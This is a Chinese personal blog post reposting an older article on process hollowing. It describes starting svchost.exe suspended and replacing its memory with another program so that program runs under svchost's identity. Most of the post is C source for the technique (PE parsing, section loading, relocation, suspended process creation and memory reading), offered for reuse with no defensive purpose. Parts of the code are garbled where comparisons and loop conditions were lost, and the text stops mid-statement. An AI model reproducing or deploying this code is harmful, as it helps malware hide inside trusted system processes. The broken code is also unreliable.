

<p><span style="white-space:pre">	</span>刚刚上Google闲的没事搜索我自己，居然找到我早至11年的博客，当时是在一个国外网站申请的博客，WordPress的。我决定把上面的内容Copy过来poi</p><p><span style="white-space:pre">	</span>这个是12年的，应该是我转载的，但是已经找不到出处，如果有人知道告诉我我会放上链接的0.0</p><p><span style="white-space:pre">	</span></p><p style="box-sizing: inherit; border: 0px; font-family: 'Noto Serif', serif; font-size: 19px; margin: 0px 0px 1.6842em; outline: 0px; padding: 0px; vertical-align: baseline; color: rgb(51, 51, 51); line-height: 31.9998px;">原理:<br style="box-sizing: inherit;" />1. 把你的程序读要内存<br style="box-sizing: inherit;" />2. 以 CREATE_SUSPENDED模式CreateProcess打开svchost.exe<br style="box-sizing: inherit;" />3. 修改svchost.exe页面的属性，然后把要运行的那个程序的内容拷贝到svchost.exe页面<br style="box-sizing: inherit;" />4. 然后再运行 实质想当于是 披着/svchost.exe进程的相关信息/这张皮，而皮里面的肉都被改了<br style="box-sizing: inherit;" />原文来自哪里忘记了，。呵呵<br style="box-sizing: inherit;" />#include<br style="box-sizing: inherit;" />#include<br style="box-sizing: inherit;" />#include<br style="box-sizing: inherit;" />//#include “ntpsapi.h”</p><p style="box-sizing: inherit; border: 0px; font-family: 'Noto Serif', serif; font-size: 19px; margin: 0px 0px 1.6842em; outline: 0px; padding: 0px; vertical-align: baseline; color: rgb(51, 51, 51); line-height: 31.9998px;">struct PEHeader<br style="box-sizing: inherit;" />{<br style="box-sizing: inherit;" />unsigned long signature;<br style="box-sizing: inherit;" />unsigned short machine;<br style="box-sizing: inherit;" />unsigned short numSections;<br style="box-sizing: inherit;" />unsigned long timeDateStamp;<br style="box-sizing: inherit;" />unsigned long pointerToSymbolTable;<br style="box-sizing: inherit;" />unsigned long numOfSymbols;<br style="box-sizing: inherit;" />unsigned short sizeOfOptionHeader;<br style="box-sizing: inherit;" />unsigned short characteristics;<br style="box-sizing: inherit;" />};<br style="box-sizing: inherit;" />typedef struct PEHeader PE_Header;</p><p style="box-sizing: inherit; border: 0px; font-family: 'Noto Serif', serif; font-size: 19px; margin: 0px 0px 1.6842em; outline: 0px; padding: 0px; vertical-align: baseline; color: rgb(51, 51, 51); line-height: 31.9998px;">struct PEExtHeader<br style="box-sizing: inherit;" />{<br style="box-sizing: inherit;" />unsigned short magic;<br style="box-sizing: inherit;" />unsigned char majorLinkerVersion;<br style="box-sizing: inherit;" />unsigned char minorLinkerVersion;<br style="box-sizing: inherit;" />unsigned long sizeOfCode;<br style="box-sizing: inherit;" />unsigned long sizeOfInitializedData;<br style="box-sizing: inherit;" />unsigned long sizeOfUninitializedData;<br style="box-sizing: inherit;" />unsigned long addressOfEntryPoint;<br style="box-sizing: inherit;" />unsigned long baseOfCode;<br style="box-sizing: inherit;" />unsigned long baseOfData;<br style="box-sizing: inherit;" />unsigned long imageBase;<br style="box-sizing: inherit;" />unsigned long sectionAlignment;<br style="box-sizing: inherit;" />unsigned long fileAlignment;<br style="box-sizing: inherit;" />unsigned short majorOSVersion;<br style="box-sizing: inherit;" />unsigned short minorOSVersion;<br style="box-sizing: inherit;" />unsigned short majorImageVersion;<br style="box-sizing: inherit;" />unsigned short minorImageVersion;<br style="box-sizing: inherit;" />unsigned short majorSubsystemVersion;<br style="box-sizing: inherit;" />unsigned short minorSubsystemVersion;<br style="box-sizing: inherit;" />unsigned long reserved1;<br style="box-sizing: inherit;" />unsigned long sizeOfImage;<br style="box-sizing: inherit;" />unsigned long sizeOfHeaders;<br style="box-sizing: inherit;" />unsigned long checksum;<br style="box-sizing: inherit;" />unsigned short subsystem;<br style="box-sizing: inherit;" />unsigned short DLLCharacteristics;<br style="box-sizing: inherit;" />unsigned long sizeOfStackReserve;<br style="box-sizing: inherit;" />unsigned long sizeOfStackCommit;<br style="box-sizing: inherit;" />unsigned long sizeOfHeapReserve;<br style="box-sizing: inherit;" />unsigned long sizeOfHeapCommit;<br style="box-sizing: inherit;" />unsigned long loaderFlags;<br style="box-sizing: inherit;" />unsigned long numberOfRVAAndSizes;<br style="box-sizing: inherit;" />unsigned long exportTableAddress;<br style="box-sizing: inherit;" />unsigned long exportTableSize;<br style="box-sizing: inherit;" />unsigned long importTableAddress;<br style="box-sizing: inherit;" />unsigned long importTableSize;<br style="box-sizing: inherit;" />unsigned long resourceTableAddress;<br style="box-sizing: inherit;" />unsigned long resourceTableSize;<br style="box-sizing: inherit;" />unsigned long exceptionTableAddress;<br style="box-sizing: inherit;" />unsigned long exceptionTableSize;<br style="box-sizing: inherit;" />unsigned long certFilePointer;<br style="box-sizing: inherit;" />unsigned long certTableSize;<br style="box-sizing: inherit;" />unsigned long relocationTableAddress;<br style="box-sizing: inherit;" />unsigned long relocationTableSize;<br style="box-sizing: inherit;" />unsigned long debugDataAddress;<br style="box-sizing: inherit;" />unsigned long debugDataSize;<br style="box-sizing: inherit;" />unsigned long archDataAddress;<br style="box-sizing: inherit;" />unsigned long archDataSize;<br style="box-sizing: inherit;" />unsigned long globalPtrAddress;<br style="box-sizing: inherit;" />unsigned long globalPtrSize;<br style="box-sizing: inherit;" />unsigned long TLSTableAddress;<br style="box-sizing: inherit;" />unsigned long TLSTableSize;<br style="box-sizing: inherit;" />unsigned long loadConfigTableAddress;<br style="box-sizing: inherit;" />unsigned long loadConfigTableSize;<br style="box-sizing: inherit;" />unsigned long boundImportTableAddress;<br style="box-sizing: inherit;" />unsigned long boundImportTableSize;<br style="box-sizing: inherit;" />unsigned long importAddressTableAddress;<br style="box-sizing: inherit;" />unsigned long importAddressTableSize;<br style="box-sizing: inherit;" />unsigned long delayImportDescAddress;<br style="box-sizing: inherit;" />unsigned long delayImportDescSize;<br style="box-sizing: inherit;" />unsigned long COMHeaderAddress;<br style="box-sizing: inherit;" />unsigned long COMHeaderSize;<br style="box-sizing: inherit;" />unsigned long reserved2;<br style="box-sizing: inherit;" />unsigned long reserved3;<br style="box-sizing: inherit;" />};<br style="box-sizing: inherit;" />typedef struct PEExtHeader PE_ExtHeader;</p><p style="box-sizing: inherit; border: 0px; font-family: 'Noto Serif', serif; font-size: 19px; margin: 0px 0px 1.6842em; outline: 0px; padding: 0px; vertical-align: baseline; color: rgb(51, 51, 51); line-height: 31.9998px;">struct Section_Header<br style="box-sizing: inherit;" />{<br style="box-sizing: inherit;" />unsigned char sectionName[8];<br style="box-sizing: inherit;" />unsigned long virtualSize;<br style="box-sizing: inherit;" />unsigned long virtualAddress;<br style="box-sizing: inherit;" />unsigned long sizeOfRawData;<br style="box-sizing: inherit;" />unsigned long pointerToRawData;<br style="box-sizing: inherit;" />unsigned long pointerToRelocations;<br style="box-sizing: inherit;" />unsigned long pointerToLineNumbers;<br style="box-sizing: inherit;" />unsigned short numberOfRelocations;<br style="box-sizing: inherit;" />unsigned short numberOfLineNumbers;<br style="box-sizing: inherit;" />unsigned long characteristics;<br style="box-sizing: inherit;" />};<br style="box-sizing: inherit;" />typedef struct Section_Header SectionHeader;</p><p style="box-sizing: inherit; border: 0px; font-family: 'Noto Serif', serif; font-size: 19px; margin: 0px 0px 1.6842em; outline: 0px; padding: 0px; vertical-align: baseline; color: rgb(51, 51, 51); line-height: 31.9998px;">struct MZ_Header<br style="box-sizing: inherit;" />{<br style="box-sizing: inherit;" />unsigned short signature;<br style="box-sizing: inherit;" />unsigned short partPag;<br style="box-sizing: inherit;" />unsigned short pageCnt;<br style="box-sizing: inherit;" />unsigned short reloCnt;<br style="box-sizing: inherit;" />unsigned short hdrSize;<br style="box-sizing: inherit;" />unsigned short minMem;<br style="box-sizing: inherit;" />unsigned short maxMem;<br style="box-sizing: inherit;" />unsigned short reloSS;<br style="box-sizing: inherit;" />unsigned short exeSP;<br style="box-sizing: inherit;" />unsigned short chksum;<br style="box-sizing: inherit;" />unsigned short exeIP;<br style="box-sizing: inherit;" />unsigned short reloCS;<br style="box-sizing: inherit;" />unsigned short tablOff;<br style="box-sizing: inherit;" />unsigned short overlay;<br style="box-sizing: inherit;" />unsigned char reserved[32];<br style="box-sizing: inherit;" />unsigned long offsetToPE;<br style="box-sizing: inherit;" />};<br style="box-sizing: inherit;" />typedef struct MZ_Header MZHeader;</p><p style="box-sizing: inherit; border: 0px; font-family: 'Noto Serif', serif; font-size: 19px; margin: 0px 0px 1.6842em; outline: 0px; padding: 0px; vertical-align: baseline; color: rgb(51, 51, 51); line-height: 31.9998px;">struct Import_DirEntry<br style="box-sizing: inherit;" />{<br style="box-sizing: inherit;" />DWORD importLookupTable;<br style="box-sizing: inherit;" />DWORD timeDateStamp;<br style="box-sizing: inherit;" />DWORD fowarderChain;<br style="box-sizing: inherit;" />DWORD nameRVA;<br style="box-sizing: inherit;" />DWORD importAddressTable;<br style="box-sizing: inherit;" />};<br style="box-sizing: inherit;" />typedef struct Import_DirEntry ImportDirEntry;</p><p style="box-sizing: inherit; border: 0px; font-family: 'Noto Serif', serif; font-size: 19px; margin: 0px 0px 1.6842em; outline: 0px; padding: 0px; vertical-align: baseline; color: rgb(51, 51, 51); line-height: 31.9998px;">struct Fixup_Block<br style="box-sizing: inherit;" />{<br style="box-sizing: inherit;" />unsigned long pageRVA;<br style="box-sizing: inherit;" />unsigned long blockSize;<br style="box-sizing: inherit;" />};<br style="box-sizing: inherit;" />typedef struct Fixup_Block FixupBlock;</p><p style="box-sizing: inherit; border: 0px; font-family: 'Noto Serif', serif; font-size: 19px; margin: 0px 0px 1.6842em; outline: 0px; padding: 0px; vertical-align: baseline; color: rgb(51, 51, 51); line-height: 31.9998px;">#define TARGETPROC “svchost.exe”</p><p style="box-sizing: inherit; border: 0px; font-family: 'Noto Serif', serif; font-size: 19px; margin: 0px 0px 1.6842em; outline: 0px; padding: 0px; vertical-align: baseline; color: rgb(51, 51, 51); line-height: 31.9998px;">typedef struct _PROCINFO<br style="box-sizing: inherit;" />{<br style="box-sizing: inherit;" />DWORD baseAddr;<br style="box-sizing: inherit;" />DWORD imageSize;<br style="box-sizing: inherit;" />} PROCINFO;</p><p style="box-sizing: inherit; border: 0px; font-family: 'Noto Serif', serif; font-size: 19px; margin: 0px 0px 1.6842em; outline: 0px; padding: 0px; vertical-align: baseline; color: rgb(51, 51, 51); line-height: 31.9998px;">BOOL EXPD = FALSE;<br style="box-sizing: inherit;" />CHAR *PID;</p><p style="box-sizing: inherit; border: 0px; font-family: 'Noto Serif', serif; font-size: 19px; margin: 0px 0px 1.6842em; outline: 0px; padding: 0px; vertical-align: baseline; color: rgb(51, 51, 51); line-height: 31.9998px;">//**********************************************************************************************************<br style="box-sizing: inherit;" />//<br style="box-sizing: inherit;" />// This function reads the MZ, PE, PE extended and Section Headers from an EXE file.<br style="box-sizing: inherit;" />//<br style="box-sizing: inherit;" />//**********************************************************************************************************<br style="box-sizing: inherit;" />//<br style="box-sizing: inherit;" />// 解析PE文件，得到 PE 结构<br style="box-sizing: inherit;" />//<br style="box-sizing: inherit;" />BOOL readPEInfo(FILE *fp, MZHeader *outMZ,PE_Header *outPE,PE_ExtHeader *outpeXH,SectionHeader **outSecHdr)<br style="box-sizing: inherit;" />{<br style="box-sizing: inherit;" />MZHeader mzH;<br style="box-sizing: inherit;" />long fileSize;<br style="box-sizing: inherit;" />PE_Header peH;<br style="box-sizing: inherit;" />PE_ExtHeader peXH;<br style="box-sizing: inherit;" />SectionHeader *secHdr;</p><p style="box-sizing: inherit; border: 0px; font-family: 'Noto Serif', serif; font-size: 19px; margin: 0px 0px 1.6842em; outline: 0px; padding: 0px; vertical-align: baseline; color: rgb(51, 51, 51); line-height: 31.9998px;">fseek(fp, 0, SEEK_END);<br style="box-sizing: inherit;" />fileSize = ftell(fp);<br style="box-sizing: inherit;" />fseek(fp, 0, SEEK_SET);</p><p style="box-sizing: inherit; border: 0px; font-family: 'Noto Serif', serif; font-size: 19px; margin: 0px 0px 1.6842em; outline: 0px; padding: 0px; vertical-align: baseline; color: rgb(51, 51, 51); line-height: 31.9998px;">if(fileSize &lt; sizeof(MZHeader))<br style="box-sizing: inherit;" />{<br style="box-sizing: inherit;" />printf(&quot;File size too small\n&quot;);<br style="box-sizing: inherit;" />return FALSE;<br style="box-sizing: inherit;" />}</p><p style="box-sizing: inherit; border: 0px; font-family: 'Noto Serif', serif; font-size: 19px; margin: 0px 0px 1.6842em; outline: 0px; padding: 0px; vertical-align: baseline; color: rgb(51, 51, 51); line-height: 31.9998px;">// read MZ Header<br style="box-sizing: inherit;" />fread(&amp;mzH, sizeof(MZHeader), 1, fp);</p><p style="box-sizing: inherit; border: 0px; font-family: 'Noto Serif', serif; font-size: 19px; margin: 0px 0px 1.6842em; outline: 0px; padding: 0px; vertical-align: baseline; color: rgb(51, 51, 51); line-height: 31.9998px;">if(mzH.signature != 0x5a4d) // MZ<br style="box-sizing: inherit;" />{<br style="box-sizing: inherit;" />printf(&quot;File does not have MZ header\n&quot;);<br style="box-sizing: inherit;" />return FALSE;<br style="box-sizing: inherit;" />}</p><p style="box-sizing: inherit; border: 0px; font-family: 'Noto Serif', serif; font-size: 19px; margin: 0px 0px 1.6842em; outline: 0px; padding: 0px; vertical-align: baseline; color: rgb(51, 51, 51); line-height: 31.9998px;">printf(&quot;Offset to PE Header = %X\n&quot;, mzH.offsetToPE);</p><p style="box-sizing: inherit; border: 0px; font-family: 'Noto Serif', serif; font-size: 19px; margin: 0px 0px 1.6842em; outline: 0px; padding: 0px; vertical-align: baseline; color: rgb(51, 51, 51); line-height: 31.9998px;">if((unsigned long)fileSize sectionAlignment;</p><p style="box-sizing: inherit; border: 0px; font-family: 'Noto Serif', serif; font-size: 19px; margin: 0px 0px 1.6842em; outline: 0px; padding: 0px; vertical-align: baseline; color: rgb(51, 51, 51); line-height: 31.9998px;">if(inpeXH-&gt;sizeOfHeaders % alignment == 0) // PE头对齐<br style="box-sizing: inherit;" />result += inpeXH-&gt;sizeOfHeaders;<br style="box-sizing: inherit;" />else<br style="box-sizing: inherit;" />{<br style="box-sizing: inherit;" />val = inpeXH-&gt;sizeOfHeaders / alignment;<br style="box-sizing: inherit;" />val++;<br style="box-sizing: inherit;" />result += (val * alignment);<br style="box-sizing: inherit;" />}</p><p style="box-sizing: inherit; border: 0px; font-family: 'Noto Serif', serif; font-size: 19px; margin: 0px 0px 1.6842em; outline: 0px; padding: 0px; vertical-align: baseline; color: rgb(51, 51, 51); line-height: 31.9998px;">for(i = 0; i numSections; i++) // 节对齐<br style="box-sizing: inherit;" />{<br style="box-sizing: inherit;" />if(inSecHdr[i].virtualSize)<br style="box-sizing: inherit;" />{<br style="box-sizing: inherit;" />if(inSecHdr[i].virtualSize % alignment == 0)<br style="box-sizing: inherit;" />result += inSecHdr[i].virtualSize;<br style="box-sizing: inherit;" />else<br style="box-sizing: inherit;" />{<br style="box-sizing: inherit;" />int val = inSecHdr[i].virtualSize / alignment;<br style="box-sizing: inherit;" />val++;<br style="box-sizing: inherit;" />result += (val * alignment);<br style="box-sizing: inherit;" />}<br style="box-sizing: inherit;" />}<br style="box-sizing: inherit;" />}</p><p style="box-sizing: inherit; border: 0px; font-family: 'Noto Serif', serif; font-size: 19px; margin: 0px 0px 1.6842em; outline: 0px; padding: 0px; vertical-align: baseline; color: rgb(51, 51, 51); line-height: 31.9998px;">return result;<br style="box-sizing: inherit;" />}</p><p style="box-sizing: inherit; border: 0px; font-family: 'Noto Serif', serif; font-size: 19px; margin: 0px 0px 1.6842em; outline: 0px; padding: 0px; vertical-align: baseline; color: rgb(51, 51, 51); line-height: 31.9998px;">//**********************************************************************************************************<br style="box-sizing: inherit;" />//<br style="box-sizing: inherit;" />// This function calculates the aligned size of a section<br style="box-sizing: inherit;" />//<br style="box-sizing: inherit;" />//**********************************************************************************************************<br style="box-sizing: inherit;" />//<br style="box-sizing: inherit;" />// 返回真实在内存中占用的大小<br style="box-sizing: inherit;" />//<br style="box-sizing: inherit;" />unsigned long getAlignedSize(unsigned long curSize, unsigned long alignment)<br style="box-sizing: inherit;" />{<br style="box-sizing: inherit;" />if(curSize % alignment == 0)<br style="box-sizing: inherit;" />return curSize;<br style="box-sizing: inherit;" />else<br style="box-sizing: inherit;" />{<br style="box-sizing: inherit;" />int val = curSize / alignment;<br style="box-sizing: inherit;" />val++;<br style="box-sizing: inherit;" />return (val * alignment);<br style="box-sizing: inherit;" />}<br style="box-sizing: inherit;" />}</p><p style="box-sizing: inherit; border: 0px; font-family: 'Noto Serif', serif; font-size: 19px; margin: 0px 0px 1.6842em; outline: 0px; padding: 0px; vertical-align: baseline; color: rgb(51, 51, 51); line-height: 31.9998px;">//**********************************************************************************************************<br style="box-sizing: inherit;" />//<br style="box-sizing: inherit;" />// This function loads a PE file into memory with proper alignment.<br style="box-sizing: inherit;" />// Enough memory must be allocated at ptrLoc.<br style="box-sizing: inherit;" />//<br style="box-sizing: inherit;" />//**********************************************************************************************************<br style="box-sizing: inherit;" />//<br style="box-sizing: inherit;" />// 加载PE文件到内存中<br style="box-sizing: inherit;" />//<br style="box-sizing: inherit;" />BOOL loadPE(FILE *fp, MZHeader *inMZ, PE_Header *inPE, PE_ExtHeader *inpeXH,SectionHeader *inSecHdr, LPVOID ptrLoc)<br style="box-sizing: inherit;" />{<br style="box-sizing: inherit;" />unsigned long headerSize, readSize;<br style="box-sizing: inherit;" />int i;<br style="box-sizing: inherit;" />char *outPtr = (char *)ptrLoc;</p><p style="box-sizing: inherit; border: 0px; font-family: 'Noto Serif', serif; font-size: 19px; margin: 0px 0px 1.6842em; outline: 0px; padding: 0px; vertical-align: baseline; color: rgb(51, 51, 51); line-height: 31.9998px;">fseek(fp, 0, SEEK_SET);<br style="box-sizing: inherit;" />headerSize = inpeXH-&gt;sizeOfHeaders;</p><p style="box-sizing: inherit; border: 0px; font-family: 'Noto Serif', serif; font-size: 19px; margin: 0px 0px 1.6842em; outline: 0px; padding: 0px; vertical-align: baseline; color: rgb(51, 51, 51); line-height: 31.9998px;">// certain PE files have sectionHeaderSize value &gt; size of PE file itself.<br style="box-sizing: inherit;" />// this loop handles this situation by find the section that is nearest to the<br style="box-sizing: inherit;" />// PE header.<br style="box-sizing: inherit;" />//<br style="box-sizing: inherit;" />// 如果文件太小，以至与PE头中还包括了节的内容，这样就先不拷贝节的内容<br style="box-sizing: inherit;" />// 当然这种情况很少见<br style="box-sizing: inherit;" />//<br style="box-sizing: inherit;" />for(i = 0; i numSections; i++)<br style="box-sizing: inherit;" />{<br style="box-sizing: inherit;" />if(inSecHdr[i].pointerToRawData sizeOfHeaders, inpeXH-&gt;sectionAlignment);</p><p style="box-sizing: inherit; border: 0px; font-family: 'Noto Serif', serif; font-size: 19px; margin: 0px 0px 1.6842em; outline: 0px; padding: 0px; vertical-align: baseline; color: rgb(51, 51, 51); line-height: 31.9998px;">// read the sections<br style="box-sizing: inherit;" />for(i = 0; i numSections; i++)<br style="box-sizing: inherit;" />{<br style="box-sizing: inherit;" />if(inSecHdr[i].sizeOfRawData &gt; 0)<br style="box-sizing: inherit;" />{<br style="box-sizing: inherit;" />unsigned long toRead = inSecHdr[i].sizeOfRawData;<br style="box-sizing: inherit;" />if(toRead &gt; inSecHdr[i].virtualSize)<br style="box-sizing: inherit;" />toRead = inSecHdr[i].virtualSize;</p><p style="box-sizing: inherit; border: 0px; font-family: 'Noto Serif', serif; font-size: 19px; margin: 0px 0px 1.6842em; outline: 0px; padding: 0px; vertical-align: baseline; color: rgb(51, 51, 51); line-height: 31.9998px;">fseek(fp, inSecHdr[i].pointerToRawData, SEEK_SET);<br style="box-sizing: inherit;" />readSize = fread(outPtr, 1, toRead, fp);</p><p style="box-sizing: inherit; border: 0px; font-family: 'Noto Serif', serif; font-size: 19px; margin: 0px 0px 1.6842em; outline: 0px; padding: 0px; vertical-align: baseline; color: rgb(51, 51, 51); line-height: 31.9998px;">if(readSize != toRead)<br style="box-sizing: inherit;" />{<br style="box-sizing: inherit;" />printf(“Error reading section %d\n”, i);<br style="box-sizing: inherit;" />return FALSE;<br style="box-sizing: inherit;" />}<br style="box-sizing: inherit;" />outPtr += getAlignedSize(inSecHdr[i].virtualSize, inpeXH-&gt;sectionAlignment);<br style="box-sizing: inherit;" />}<br style="box-sizing: inherit;" />else<br style="box-sizing: inherit;" />{<br style="box-sizing: inherit;" />// this handles the case where the PE file has an empty section. E.g. UPX0 section<br style="box-sizing: inherit;" />// in UPXed files.</p><p style="box-sizing: inherit; border: 0px; font-family: 'Noto Serif', serif; font-size: 19px; margin: 0px 0px 1.6842em; outline: 0px; padding: 0px; vertical-align: baseline; color: rgb(51, 51, 51); line-height: 31.9998px;">if(inSecHdr[i].virtualSize)<br style="box-sizing: inherit;" />outPtr += getAlignedSize(inSecHdr[i].virtualSize, inpeXH-&gt;sectionAlignment);<br style="box-sizing: inherit;" />}<br style="box-sizing: inherit;" />}</p><p style="box-sizing: inherit; border: 0px; font-family: 'Noto Serif', serif; font-size: 19px; margin: 0px 0px 1.6842em; outline: 0px; padding: 0px; vertical-align: baseline; color: rgb(51, 51, 51); line-height: 31.9998px;">return TRUE;<br style="box-sizing: inherit;" />}</p><p style="box-sizing: inherit; border: 0px; font-family: 'Noto Serif', serif; font-size: 19px; margin: 0px 0px 1.6842em; outline: 0px; padding: 0px; vertical-align: baseline; color: rgb(51, 51, 51); line-height: 31.9998px;">//**********************************************************************************************************<br style="box-sizing: inherit;" />//<br style="box-sizing: inherit;" />// This function loads a PE file into memory with proper alignment.<br style="box-sizing: inherit;" />// Enough memory must be allocated at ptrLoc.<br style="box-sizing: inherit;" />//<br style="box-sizing: inherit;" />//**********************************************************************************************************</p><p style="box-sizing: inherit; border: 0px; font-family: 'Noto Serif', serif; font-size: 19px; margin: 0px 0px 1.6842em; outline: 0px; padding: 0px; vertical-align: baseline; color: rgb(51, 51, 51); line-height: 31.9998px;">void doRelocation(MZHeader *inMZ, PE_Header *inPE, PE_ExtHeader *inpeXH,<br style="box-sizing: inherit;" />SectionHeader *inSecHdr, LPVOID ptrLoc, DWORD newBase)<br style="box-sizing: inherit;" />{<br style="box-sizing: inherit;" />long delta;<br style="box-sizing: inherit;" />int numEntries,i, relocType;<br style="box-sizing: inherit;" />unsigned short *offsetPtr;<br style="box-sizing: inherit;" />DWORD *codeLoc;<br style="box-sizing: inherit;" />FixupBlock *fixBlk;</p><p style="box-sizing: inherit; border: 0px; font-family: 'Noto Serif', serif; font-size: 19px; margin: 0px 0px 1.6842em; outline: 0px; padding: 0px; vertical-align: baseline; color: rgb(51, 51, 51); line-height: 31.9998px;">if(inpeXH-&gt;relocationTableAddress &amp;&amp; inpeXH-&gt;relocationTableSize)<br style="box-sizing: inherit;" />{<br style="box-sizing: inherit;" />fixBlk = (FixupBlock *)((char *)ptrLoc + inpeXH-&gt;relocationTableAddress);<br style="box-sizing: inherit;" />delta = newBase – inpeXH-&gt;imageBase;</p><p style="box-sizing: inherit; border: 0px; font-family: 'Noto Serif', serif; font-size: 19px; margin: 0px 0px 1.6842em; outline: 0px; padding: 0px; vertical-align: baseline; color: rgb(51, 51, 51); line-height: 31.9998px;">while(fixBlk-&gt;blockSize)<br style="box-sizing: inherit;" />{<br style="box-sizing: inherit;" />printf(“Addr = %X\n”, fixBlk-&gt;pageRVA);<br style="box-sizing: inherit;" />printf(“Size = %X\n”, fixBlk-&gt;blockSize);</p><p style="box-sizing: inherit; border: 0px; font-family: 'Noto Serif', serif; font-size: 19px; margin: 0px 0px 1.6842em; outline: 0px; padding: 0px; vertical-align: baseline; color: rgb(51, 51, 51); line-height: 31.9998px;">numEntries = (fixBlk-&gt;blockSize – sizeof(FixupBlock)) &gt;&gt; 1;<br style="box-sizing: inherit;" />printf(“Num Entries = %d\n”, numEntries);</p><p style="box-sizing: inherit; border: 0px; font-family: 'Noto Serif', serif; font-size: 19px; margin: 0px 0px 1.6842em; outline: 0px; padding: 0px; vertical-align: baseline; color: rgb(51, 51, 51); line-height: 31.9998px;">offsetPtr = (unsigned short *)(fixBlk + 1);</p><p style="box-sizing: inherit; border: 0px; font-family: 'Noto Serif', serif; font-size: 19px; margin: 0px 0px 1.6842em; outline: 0px; padding: 0px; vertical-align: baseline; color: rgb(51, 51, 51); line-height: 31.9998px;">for(i = 0; i pageRVA + (*offsetPtr &amp; 0x0FFF));</p><p style="box-sizing: inherit; border: 0px; font-family: 'Noto Serif', serif; font-size: 19px; margin: 0px 0px 1.6842em; outline: 0px; padding: 0px; vertical-align: baseline; color: rgb(51, 51, 51); line-height: 31.9998px;">relocType = (*offsetPtr &amp; 0xF000) &gt;&gt; 12;</p><p style="box-sizing: inherit; border: 0px; font-family: 'Noto Serif', serif; font-size: 19px; margin: 0px 0px 1.6842em; outline: 0px; padding: 0px; vertical-align: baseline; color: rgb(51, 51, 51); line-height: 31.9998px;">printf(“Val = %X\n”, *offsetPtr);<br style="box-sizing: inherit;" />printf(“Type = %X\n”, relocType);</p><p style="box-sizing: inherit; border: 0px; font-family: 'Noto Serif', serif; font-size: 19px; margin: 0px 0px 1.6842em; outline: 0px; padding: 0px; vertical-align: baseline; color: rgb(51, 51, 51); line-height: 31.9998px;">if(relocType == 3)<br style="box-sizing: inherit;" />*codeLoc = ((DWORD)*codeLoc) + delta;<br style="box-sizing: inherit;" />else<br style="box-sizing: inherit;" />{<br style="box-sizing: inherit;" />printf(“Unknown relocation type = %d\n”, relocType);<br style="box-sizing: inherit;" />}<br style="box-sizing: inherit;" />offsetPtr++;<br style="box-sizing: inherit;" />}</p><p style="box-sizing: inherit; border: 0px; font-family: 'Noto Serif', serif; font-size: 19px; margin: 0px 0px 1.6842em; outline: 0px; padding: 0px; vertical-align: baseline; color: rgb(51, 51, 51); line-height: 31.9998px;">fixBlk = (FixupBlock *)offsetPtr;<br style="box-sizing: inherit;" />}<br style="box-sizing: inherit;" />}<br style="box-sizing: inherit;" />}</p><p style="box-sizing: inherit; border: 0px; font-family: 'Noto Serif', serif; font-size: 19px; margin: 0px 0px 1.6842em; outline: 0px; padding: 0px; vertical-align: baseline; color: rgb(51, 51, 51); line-height: 31.9998px;">//**********************************************************************************************************<br style="box-sizing: inherit;" />//<br style="box-sizing: inherit;" />// Creates the original EXE in suspended mode and returns its info in the PROCINFO structure.<br style="box-sizing: inherit;" />//<br style="box-sizing: inherit;" />//**********************************************************************************************************</p><p style="box-sizing: inherit; border: 0px; font-family: 'Noto Serif', serif; font-size: 19px; margin: 0px 0px 1.6842em; outline: 0px; padding: 0px; vertical-align: baseline; color: rgb(51, 51, 51); line-height: 31.9998px;">BOOL createChild(PPROCESS_INFORMATION pi, // OUT<br style="box-sizing: inherit;" />PCONTEXT ctx, // OUT<br style="box-sizing: inherit;" />PROCINFO *outChildProcInfo // OUT<br style="box-sizing: inherit;" />)<br style="box-sizing: inherit;" />{<br style="box-sizing: inherit;" />PROCINFO *outChildProcInfo2 = NULL;<br style="box-sizing: inherit;" />STARTUPINFO si = {0};<br style="box-sizing: inherit;" />DWORD read;<br style="box-sizing: inherit;" />DWORD *pebInfo;<br style="box-sizing: inherit;" />DWORD curAddr;<br style="box-sizing: inherit;" />MEMORY_BASIC_INFORMATION memInfo, memInfo2;<br style="box-sizing: inherit;" />DEBUG_EVENT DBEvent;<br style="box-sizing: inherit;" />DWORD read2, curAddr2;<br style="box-sizing: inherit;" />DWORD *pebInfo2;</p><p style="box-sizing: inherit; border: 0px; font-family: 'Noto Serif', serif; font-size: 19px; margin: 0px 0px 1.6842em; outline: 0px; padding: 0px; vertical-align: baseline; color: rgb(51, 51, 51); line-height: 31.9998px;">if(!EXPD)<br style="box-sizing: inherit;" />{<br style="box-sizing: inherit;" />if(CreateProcess(NULL,<br style="box-sizing: inherit;" />TARGETPROC,<br style="box-sizing: inherit;" />NULL,<br style="box-sizing: inherit;" />NULL,<br style="box-sizing: inherit;" />0,<br style="box-sizing: inherit;" />CREATE_SUSPENDED,<br style="box-sizing: inherit;" />NULL,<br style="box-sizing: inherit;" />NULL,<br style="box-sizing: inherit;" />&amp;si,<br style="box-sizing: inherit;" />pi))<br style="box-sizing: inherit;" />{<br style="box-sizing: inherit;" />ctx-&gt;ContextFlags=CONTEXT_FULL;<br style="box-sizing: inherit;" />GetThreadContext(pi-&gt;hThread, ctx);</p><p style="box-sizing: inherit; border: 0px; font-family: 'Noto Serif', serif; font-size: 19px; margin: 0px 0px 1.6842em; outline: 0px; padding: 0px; vertical-align: baseline; color: rgb(51, 51, 51); line-height: 31.9998px;">// // 获取外壳进程运行状态，[ctx.Ebx+8]内存处存的是外壳进程的加载基址，ctx.Eax存放有外壳进程的入口地址<br style="box-sizing: inherit;" />pebInfo = (DWORD *)ctx-&gt;Ebx;<br style="box-sizing: inherit;" />ReadProcessMemory(pi-&gt;hProcess, &amp;pebInfo[2], (LPVOID)&amp;(outChildProcInfo-&gt;baseAddr), sizeof(DWORD), &amp;read);</p><p style="box-sizing: inherit; border: 0px; font-family: 'Noto Serif', serif; font-size: 19px; margin: 0px 0px 1.6842em; outline: 0px; padding: 0px; vertical-align: baseline; color: rgb(51, 51, 51); line-height: 31.9998px;">curAddr = outChildProcInfo-&gt;baseAddr;</p><p style="box-sizing: inherit; border: 0px; font-family: 'Noto Serif', serif; font-size: 19px; margin: 0px 0px 1.6842em; outline: 0px; padding: 0px; vertical-align: baseline; color: rgb(51, 51, 51); line-height: 31.9998px;">//在 SVCHOST.EXE中寻找 MEM_FREE 的内存地址<br style="box-sizing: inherit;" />while(VirtualQueryEx(pi-&gt;hProcess, (LPVOID)curAddr, &amp;memInfo, sizeof(memInfo)))<br style="box-sizing: inherit;" />{<br style="box-sizing: inherit;" />if(memInfo.State == MEM_FREE)<br style="box-sizing: inherit;" />break;<br style="box-sizing: inherit;" />curAddr += memInfo.RegionSize;<br style="box-sizing: inherit;" />}<br style="box-sizing: inherit;" />outChildProcInfo-&gt;imageSize = 